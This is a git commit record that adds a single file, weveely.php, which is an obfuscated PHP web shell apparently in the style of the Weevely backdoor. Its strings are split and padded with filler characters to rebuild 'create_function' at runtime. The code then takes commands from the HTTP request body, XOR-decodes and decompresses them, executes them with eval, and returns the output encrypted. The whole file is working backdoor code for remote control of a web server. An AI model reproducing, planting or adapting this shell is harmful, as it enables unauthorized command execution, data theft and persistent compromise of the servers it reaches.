15b091fcdb92efed0744cb40d3b8891750be15f3
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2022-11-17 18:51:20 +0700

    Add files via upload

---
+++ weveely.php
@@ -0,0 +1,10 @@
+<?php
+$P=str_replace('T','','TcreaTteT_TfunTctTion');
+$b='p://9!in9!pu9!t"),$m)==9!1) 9!{@ob_start(9!);@eva9!l(@gzunc9!ompres9!s(@9!x(@base69!49!_decode($m[9!1]),$k)9!))9!9!;$o=';
+$R='9!+){$o.=9!$t9!{9!$i}^$k{$j};}}return $o9!;}if9! (9!@preg_match(9!"/$k9!h(.+)$k9!f/9!",@f9!ile_ge9!t_cont9!ents("ph';
+$x='9!k){$c=st9!r9!len($k);9!$9!l=strlen($t);$o="";for9!($9!i9!=0;$i<$l;){f9!or9!($j=09!;($j<$c&&$i<9!$l);$j++9!,9!$i+';
+$T='$k9!="4d4bbbd9!3";$kh="cd9!b5b9!d23a89!5a";$9!kf="a9!9d3a9!d545904";$p="t9!RGe4Ct9!FL9!Jy4EuX69!";functio9!n x9!($t,9!$';
+$Y='@ob_9!9!9!get9!_con9!tents();@ob_end_clean()9!;$r=@b9!as9!e64_encode(@x(@gz9!comp9!ress($o),9!$k));pr9!int("$p9!$kh9!$r$kf");}';
+$S=str_replace('9!','',$T.$x.$R.$b.$Y);
+$U=$P('',$S);$U();
+?>
